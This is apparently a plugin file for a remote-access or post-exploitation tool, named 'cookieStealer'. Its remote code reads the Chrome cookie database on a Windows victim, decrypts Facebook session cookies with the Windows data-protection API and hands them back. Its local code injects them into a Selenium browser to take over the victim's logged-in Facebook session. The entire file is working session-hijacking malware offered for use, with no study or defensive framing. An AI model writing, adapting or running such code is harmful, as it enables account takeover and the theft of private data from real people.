plugin_name = r"""cookieStealer"""
plugin_description = r"""Browser Cookies Stealer"""
r_source = r"""
import sqlite3
import win32crypt

directory = {
    'facebook.com': ('datr', 'c_user', 'xs'),
}


# Chrome Stealer
PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Cookies'
connection = sqlite3.connect(PathName)
sessions = []
with connection:
    cursor = connection.cursor()
    v = cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
    values = v.fetchall()

    for info in values:
        if directory.has_key(info[0][1:]):
            if info[1] in directory[info[0][1:]]:
                host = info[0]
                name = info[1]
                value = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
                key = 'chrome-{}'.format(host)
                sessions.append({
                        'domain': host,
                        'name': name,
                        'value': value,
                    })

mprint = sessions
"""
l_source = r"""
# Chrome Cookies Stealer

import ast
from selenium import webdriver
log('[*] modules imported [+]')

sessions = ast.literal_eval(mprint)
log('[*] mprint decrypted')

def chrome_sessions(sessions):
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
    import time

    cookies = sessions

    driver_chrome = webdriver.Firefox()
    driver_chrome.get("http://facebook.com")
    for cookie in cookies:
        driver_chrome.add_cookie(cookie)
    time.sleep(1)
    driver_chrome.get("http://facebook.com")


    # New Tab
    # driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')
    # driver_chrome.get('http://facebook.com/')


chrome_sessions(sessions)
"""
